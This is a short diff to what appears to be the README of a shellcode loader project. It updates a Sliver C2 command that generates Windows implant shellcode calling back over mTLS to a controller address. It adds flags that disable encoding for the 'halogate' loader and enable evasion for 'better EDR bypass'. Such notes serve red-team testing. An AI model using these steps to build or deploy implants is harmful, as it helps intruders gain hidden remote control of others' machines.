@@ -46,7 +46,8 @@ sudo apt install mono-complete
 
 ```
 ### To Generate a Sliver implant shellcode without obfuscation:
-# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/sn0wldr/input/
+### For latest Sliver, it has shellcode encoding enabled by default which somehow break the halogate loader, so need to disable it when generate the shellcode by issue "-G". Evasion and Obfuscation can both be enabled for better EDR bypass: 
+# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 -e -G -f shellcode --save /root/Codes/sn0wldr/input/
 # [*] Generating new windows/amd64 implant binary
 # [!] Symbol obfuscation is disabled
 # [*] Build completed in 00:01:25
